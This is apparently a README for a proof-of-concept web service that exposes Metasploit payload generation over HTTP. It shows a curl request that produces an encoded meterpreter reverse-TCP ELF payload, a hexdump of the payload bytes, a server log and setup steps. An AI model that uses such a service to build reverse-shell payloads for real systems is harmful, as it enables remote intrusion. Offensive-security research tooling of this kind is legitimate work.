# Venom as a Service
![Venom](http://vignette2.wikia.nocookie.net/mugen/images/8/8a/Venom.png/revision/latest?cb=20120325053415)
## Overview
As we know, [metasploit-framework](https://github.com/rapid7/metasploit-framework) is sunsetting `msfencode` and `msfpayload`. This, in combination with the recent move to Ruby 2.X seemed like an interesting research project.

This is a stupid PoC to show a few things:

  * MSF integration is becoming easier, but is still a PITA.
  * MSF setup/load times FAR exceed *actual* time spent doing anything.
  * Integration is still possible, allowing for extremely fast functionality.
  * Ruby 2.2.0 should function with MSF. No idea why they froze with 2.1.5.
  
There's a bunch of setup and shenanigans involved in getting this working, but here's a basic overview of what's happening.


### Using cURL
```
sweetjones @vaas <2.2.0@vaas> $ curl -sL 'http://localhost:4567/payload?payload=linux%2Fx86%2Fmeterpreter%2Freverse_tcp&format=elf&encoder=x86%2Fshikata_ga_nai&lhost=127.0.0.1&lport=8888' | xxd
0000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
0000010: 0200 0300 0100 0000 5480 0408 3400 0000  ........T...4...
0000020: 0000 0000 0000 0000 3400 2000 0100 0000  ........4. .....
0000030: 0000 0000 0100 0000 0000 0000 0080 0408  ................
0000040: 0080 0408 b600 0000 1801 0000 0700 0000  ................
0000050: 0010 0000 dac6 ba7d 816e 1fd9 7424 f45b  .......}.n..t$.[
0000060: 31c9 b112 3153 1a83 ebfc 0353 16e2 88b0  1...1S.....S....
0000070: b5e8 91e0 0a44 3f05 3d0c 36e8 f051 dfb0  .....D?.=.6..Q..
0000080: 622d df46 72b9 dd46 5681 68a7 fc97 3278  b-.Fr..FV.h...2x
0000090: 500f 4b99 1162 cbe8 91c5 cb1c 9e35 42ff  P.K..b.......5B.
00000a0: 5fde 58c1 832d d0bc 8eae 4bb6 f036 ddc4  _.X..-....K..6..
00000b0: 424b ec55 5dad                           BK.U].
sweetjones @vaas <2.2.0@vaas> $
```

### Server Log
```
[27/Jan/2015 02:51:50] "GET /payload?payload=linux%2Fx86%2Fmeterpreter%2Freverse_tcp&format=elf&encoder=x86%2Fshikata_ga_nai&lhost=127.0.0.1&lport=8888 HTTP/1.1" 200 182 0.0088
```

It took 0.0088s to generate that ELF payload. All that needed to happen was a `GET` request to `/payload` with the following parameters:

  * payload=
  * format=
  * encoder=
  * lhost=
  * lport=
  
Too late to get into the code. Here's the setup:

  * `git --recursive clone $THIS_REPO_URL` Clone this repo and submodules
  * `cd $THIS_REPO` Change directory into this repo
  * `cp -Rf msf_gemfile_lock.txt msfdir/Gemfile.lock` Overwrite Gemfile's requirements
  * `cp -Rf msf_config_boot_rb.txt msfdir/config/boot.rb` Overwrite another MSF file.
  * `cd msfdir` Go into the MSF directory
  * `bundle install` Install MSF dependencies
  * `cd ..` Go back to $REPO directory
  * `bundle install` Install repo dependencies
  * `ruby app.rb`
  
That should work.
  